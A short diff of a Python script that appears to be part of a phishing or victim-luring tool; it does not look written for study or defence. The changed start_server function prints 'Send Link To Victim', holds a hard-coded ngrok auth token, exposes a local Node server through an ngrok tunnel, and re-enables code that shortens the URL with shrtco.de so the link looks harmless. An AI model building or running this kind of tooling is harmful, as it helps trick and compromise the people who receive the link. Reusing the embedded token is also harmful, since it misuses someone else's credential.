@@ -37,7 +37,7 @@ def excute_commands(cmd):
     if len(cmd_l) == 1:
         match cmd_l[0]:
             case "start":
-                os.system('node server.js')
+                start_server()
             case "0":
                 exit()
             case "help":
@@ -48,11 +48,10 @@ def start_server():
         print("[!] Send Link To Victim")
         conf.get_default().auth_token = "2K9q5ajABw8G2yq7a0PXCUvuOgV_753xRBrXYKTtBZgCNm51X"
         url = ngrok.connect(5000, "http")
-        # x = requests.get('https://api.shrtco.de/v2/shorten?url=' + str(url_extract(url))).text
-        # json_data = json.loads(x)
-        # print('[+] '+ json_data['result']['full_short_link'])
-        # print("[+] "+ str(url_extract(url)))
-        print(url)
+        x = requests.get('https://api.shrtco.de/v2/shorten?url=' + str(url_extract(url))).text
+        json_data = json.loads(x)
+        print('[+] '+ json_data['result']['full_short_link'])
+        print("[+] "+ str(url_extract(url)))
         os.system("node server.js")
     except:
         print(" [Err] Something went wrong..!")
